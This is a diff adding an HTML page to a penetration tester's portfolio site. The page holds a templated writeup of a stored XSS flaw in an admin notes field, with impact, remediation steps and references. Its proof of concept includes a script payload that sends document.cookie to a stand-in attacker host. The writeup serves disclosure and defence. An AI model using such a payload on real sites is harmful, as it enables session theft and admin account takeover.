@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXENNNNNNNN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+<!-- Writeup content -->
+<article class="markdown-body"><h1>Penetration Testing Writeup: XSS in Admin Panel</h1>
+<h2>Executive Summary</h2>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability was found in [Target
+Application]’s admin panel during a penetration test. This allows attackers to
+inject scripts into admin inputs, affecting admin users. This report details the
+issue and remediation steps.</p>
+<h2>Vulnerability Details</h2>
+<ul>
+<li><strong>Vulnerability Type</strong>: Cross-Site Scripting (XSS) - Stored</li>
+<li><strong>Severity</strong>: Critical</li>
+<li><strong>Affected Component</strong>: Admin note field</li>
+<li><strong>CWE</strong>: CWE-79 (Improper Neutralization of Input During Web Page Generation)</li>
+<li><strong>Location</strong>: <code>https://[target-application]/admin/notes</code></li>
+<li><strong>Discovered By</strong>: [PenTester Name]</li>
+<li><strong>Date Discovered</strong>: August 30, 2025</li>
+</ul>
+<h3>Description</h3>
+<p>The admin note field does not sanitize inputs before storing and displaying
+them, allowing script execution in the admin panel.</p>
+<h3>Impact</h3>
+<ul>
+<li><strong>Admin Account Takeover</strong>: Admin cookies can be stolen.</li>
+<li><strong>Data Exfiltration</strong>: Admin data can be sent to attackers.</li>
+<li><strong>Phishing</strong>: Fake forms can capture admin credentials.</li>
+<li><strong>System Compromise</strong>: Admin access can lead to full system control.</li>
+</ul>
+<h3>Proof of Concept</h3>
+<ol>
+<li>In the admin panel, add a note: <code>&lt;script&gt;alert(&#39;Stored XSS&#39;);&lt;/script&gt;</code>.</li>
+<li>View the note and observe the alert.</li>
+<li>Malicious payload:
+<code>&lt;script&gt;fetch(&#39;https://attacker.com/steal?cookie=&#39;+document.cookie);&lt;/script&gt;</code>.</li>
+</ol>
+<h3>Steps to Reproduce</h3>
+<ol>
+<li>Log in to <code>https://[target-application]/admin/notes</code>.</li>
+<li>Add a note with <code>&lt;script&gt;alert(&#39;Stored XSS&#39;);&lt;/script&gt;</code>.</li>
+<li>View the note to confirm the alert.</li>
+</ol>
+<h2>Remediation Recommendations</h2>
+<ol>
+<li><strong>Input Sanitization</strong>:<ul>
+<li>Use OWASP AntiSamy for note inputs.</li>
+</ul>
+</li>
+<li><strong>Output Encoding</strong>:<ul>
+<li>Encode notes before rendering.</li>
+</ul>
+</li>
+<li><strong>Content Security Policy</strong>:<ul>
+<li>Apply CSP: <code>Content-Security-Policy: script-src &#39;self&#39;;</code>.</li>
+</ul>
+</li>
+<li><strong>Secure Development</strong>:<ul>
+<li>Train admins and developers on XSS prevention.</li>
+</ul>
+</li>
+<li><strong>Security Testing</strong>:<ul>
+<li>Conduct regular audits.</li>
+</ul>
+</li>
+</ol>
+<h2>Conclusion</h2>
+<p>The Stored XSS vulnerability in [Target Application]’s admin panel is critical
+and requires immediate remediation.</p>
+<h2>References</h2>
+<ul>
+<li>OWASP XSS Prevention Cheat Sheet:
+<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li>CWE-79: <a href="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</a></li>
+</ul>
+<p><img src="https://example.com/images/admin-xss-example.png" alt="Admin XSS Example"></p>
+</article>
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
